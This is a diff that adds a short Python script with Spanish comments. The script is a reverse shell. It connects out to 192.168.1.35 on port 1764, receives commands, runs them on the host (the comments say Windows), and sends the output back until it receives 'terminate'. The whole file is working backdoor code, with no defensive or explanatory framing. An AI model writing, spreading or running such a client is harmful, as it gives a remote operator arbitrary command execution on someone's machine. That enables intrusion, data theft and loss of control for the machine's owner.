@@ -1,0 +1,22 @@
+import socket
+import subprocess
+
+def connect():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('192.168.1.35', 1764))  # Reemplaza 'ip_servidor_linux' con la dirección IP del servidor Linux
+
+    while True:
+        command = s.recv(4096).decode()  # Recibe el comando desde el servidor Linux
+
+        if command.lower() == "terminate":
+            s.close()
+            break
+
+        output = subprocess.getoutput(command)  # Ejecuta el comando en Windows
+        s.send(output.encode())  # Envía el resultado al servidor Linux
+
+def main():
+    connect()
+
+if __name__ == "__main__":
+    main()
